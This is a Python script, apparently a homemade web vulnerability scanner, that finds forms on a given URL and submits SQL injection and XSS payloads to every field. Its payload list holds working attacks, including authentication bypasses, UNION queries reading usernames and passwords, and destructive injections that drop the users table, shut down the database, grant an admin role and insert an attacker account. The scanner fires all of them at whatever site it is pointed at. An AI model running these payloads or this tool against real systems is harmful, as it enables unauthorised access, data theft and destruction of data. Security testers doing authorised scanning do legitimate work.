import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
from colorama import init, Fore, Style
import json

init(autoreset=True)

sql_payloads = [
    # Basic authentication bypass
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "' OR ''='",

    # Tautology with different quotes
    '" OR "1"="1',
    "') OR ('1'='1",
    "') OR '1'='1' --",

    # UNION-based SQLi
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",

    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT version()) AS INT)--",

    # Time-based blind SQLi
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    
    # Update-based
    "'; UPDATE users SET role='admin' WHERE username='victim'; --",
    "abc'; UPDATE users SET salary='9999' WHERE name='Alice'; --",

    # Insert-based
    "'; INSERT INTO users (username, password) VALUES ('attacker','pass'); --",

    # Obfuscation/bypass filter
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1 /*",
    "' OR 1=1 ORDER BY 1--",
    "'/*!OR*/ 1=1--",
    "x' OR 1=1--",
    "' OR 1=1 --+",

    # Compound statement
    "'; DROP TABLE users; --",
    "'; SHUTDOWN --",
]
xss_payloads = [
    "<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"
]

scanned_forms = set()
results = []

def get_all_forms(url):
    res = requests.get(url)
    soup = BeautifulSoup(res.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form, url):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        if name:
            inputs.append(name)
    form_id = (urljoin(url, action), method, tuple(sorted(inputs)))
    if form_id in scanned_forms:
        return None  # duplicate
    scanned_forms.add(form_id)
    details["action"] = urljoin(url, action)
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response, baseline_len=None):
    errors = ["you have an error in your sql", "warning: mysql", "unclosed quotation mark"]
    for error in errors:
        if error in response.text.lower():
            return True
    if baseline_len and abs(len(response.text) - baseline_len) > 20:
        return True
    return False

def scan_form(form_details, url):
    is_vuln = False
    baseline_data = {input_name: "test" for input_name in form_details["inputs"]}
    method = form_details["method"]
    action = form_details["action"]

    baseline = None
    if method == "post":
        res = requests.post(action, data=baseline_data)
    else:
        res = requests.get(action, params=baseline_data)
    baseline = len(res.text)

    for payload in sql_payloads:
        for name in form_details["inputs"]:
            data = baseline_data.copy()
            data[name] = payload
            if method == "post":
                res = requests.post(action, data=data)
            else:
                res = requests.get(action, params=data)
            if is_vulnerable(res, baseline):
                risk = "High" if any(kw in payload.lower() for kw in ["drop", "update", "delete"]) else "Medium"
                print(Fore.RED + f"[!] Possible SQL Injection detected ({method.upper()}) with payload: {payload} [Risk: {risk}]")
                results.append({
                    "url": action,
                    "parameter": name,
                    "method": method.upper(),
                    "vulnerability": "SQL Injection",
                    "payload": payload,
                    "risk": risk
                })
                is_vuln = True

    for payload in xss_payloads:
        for name in form_details["inputs"]:
            data = baseline_data.copy()
            data[name] = payload
            if method == "post":
                res = requests.post(action, data=data)
            else:
                res = requests.get(action, params=data)
            if payload in res.text:
                print(Fore.YELLOW + f"[!] Possible XSS detected ({method.upper()}) with payload: {payload} [Risk: Medium]")
                results.append({
                    "url": action,
                    "parameter": name,
                    "method": method.upper(),
                    "vulnerability": "XSS",
                    "payload": payload,
                    "risk": "Medium"
                })
                is_vuln = True

    if not is_vuln:
        print(Fore.GREEN + f"[✓] No vulnerabilities found for: {action} [{method.upper()}]")

def scan(url):
    print(Fore.CYAN + f"[~] Searching for forms in: {url}\n")
    forms = get_all_forms(url)
    if not forms:
        print("[-] No forms found.")
        return

    for i, form in enumerate(forms):
        details = get_form_details(form, url)
        if not details:
            continue
        print(Fore.BLUE + f"[+] Found form #{i+1}")
        print(f"    Action: {details['action']}, Method: {details['method'].upper()}, Fields: {details['inputs']}\n")
        scan_form(details, url)

    if not results:
        print(Fore.GREEN + "[✓] No vulnerabilities detected in any form.")
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f"report_{timestamp}.json", "w") as f:
            json.dump(results, f, indent=4)
        print(Fore.MAGENTA + f"\n[✓] Scan completed. Report saved to report_{timestamp}.json")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python scanner.py <url>")
    else:
        scan(sys.argv[1])
